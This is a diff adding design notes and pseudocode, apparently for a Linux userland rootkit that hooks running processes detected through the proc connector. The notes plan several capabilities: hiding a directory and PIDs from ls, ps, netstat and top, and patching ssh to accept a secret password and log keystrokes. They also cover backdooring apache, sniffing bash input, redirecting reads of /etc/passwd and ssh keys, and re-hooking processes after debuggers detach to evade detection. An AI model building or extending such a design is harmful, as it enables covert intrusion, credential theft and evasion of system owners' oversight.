@@ -71,5 +71,63 @@ this gives us an idea as to what to do... more ideas i get the more I'm thinking
 another idea(s):
     since im already editing so many system calls why not just make a plugin framework for all this trickery? couldn't be that hard and it 
     would allow me time to finally make a working base instead of this per-function hackery that is going on lately
-    
-    
+
+
+updates: using the proc connector we should be able to monitor for PID events like a new PID, exec calls and the like. This totally eliminates
+any need for fork/clone() hackery which may have bogged down the system anyway. Another note on efficiency: getdents returns 
+
+struct linux_dirent {
+    unsigned long  d_ino;     /* Inode number */
+    unsigned long  d_off;     /* Offset to next linux_dirent */
+    unsigned short d_reclen;  /* Length of this linux_dirent */
+    char           d_name[];  /* Filename (null-terminated) */
+    /* length is actually (d_reclen - 2 -
+    offsetof(struct linux_dirent, d_name) */
+    /*
+    char           pad;       // Zero padding byte
+    char           d_type;    // File type (only since Linux 2.6.4;
+    // offset is (d_reclen - 1))
+}
+
+thus to skip an entry for the purpose of hiding we need only modify the d_off to offset past the skipped entry to the next. This is rather easy,
+but only tests can tell...
+since it's becoming more and more apparent that we're going to be using the proc connector i've been thinking about what to do with it and the
+psuedo psuedo code design looks something like this:
+ {
+     switch(getevent()) {
+	 case EXEC:
+	     if((type=is_to_be_hooked(pid))): // this checks a list against /proc/<pid>/cmdline and other tests to see if it's interesting to hook
+		spawn_new_thread(handle_pid(pid,type))
+	     if((typeis_to_be_patched(pid))): // this will be a configable list of programs that can be patched as opposed to hooked
+		 patch_pid(pid,type);
+	case FORK:
+	    if(is_parent_of_hooked(pid)):
+		spawn_new_thread(handle_pid(pid, type))
+    }
+    // from here each pid type hooked will have its own hookem(pid) function which will map out the system call handlers for each syscall
+    // for example: ps program will have an entirely different hookem and thus getdents modify than the ls handler might
+    is_to_be_hooked(pid) {
+	for proc in proc_list:
+	    if proc =~ "/proc/<pid>/cmdline":
+		return proc_type
+	// not in list
+	return 0
+    handle_pid(pid, type) {
+	
+    }
+}
+ok so optionally I would also like the ability to not only install hooks but insert break points into certain parts of the running process
+this can be achieved by loading the GOT, finding it in memory and placing the break code. The hookem() should handle the situation according
+to the options. 
+here's a list of programs and their candidate hooks/patches/syscalls:
+ls/file managers (ie: nautilus, du, etc): getdents() redirect to hide a given directory strstr('.leetdir', dent.name)
+netstat/ps/top: getdents(): hide certan pids in /proc, edit read() calls from /proc/* : big ones: /proc/modules /proc/net/* 
+ssh: patch to admit certain pass, monitor read/open to act as keylogger for both ssh and sshd, patch to log incorrectly
+apache: hook read/socket ops to facilitate backdoor thru web service
+gdb/debuggers/strace: hook ptrace to get pid of potentially already hooked pid, if pid is hooked unhook and then rehook after the ptrace_dettach
+bash: read(0, ) sniffing/recording. along with other session info
+other misc hooks:
+    open() redirects to files (/etc/passwd, ssh_auth keys, /etc/hosts)
+    connect()/socket() for forced proxying (may break many apps)
+drawbacks:  :(
+http://www.stanford.edu/~talg/papers/traps/traps-ndss03.pdf -- author of the OS-based IDS Janus ran into similar trouble and switched to LKM..
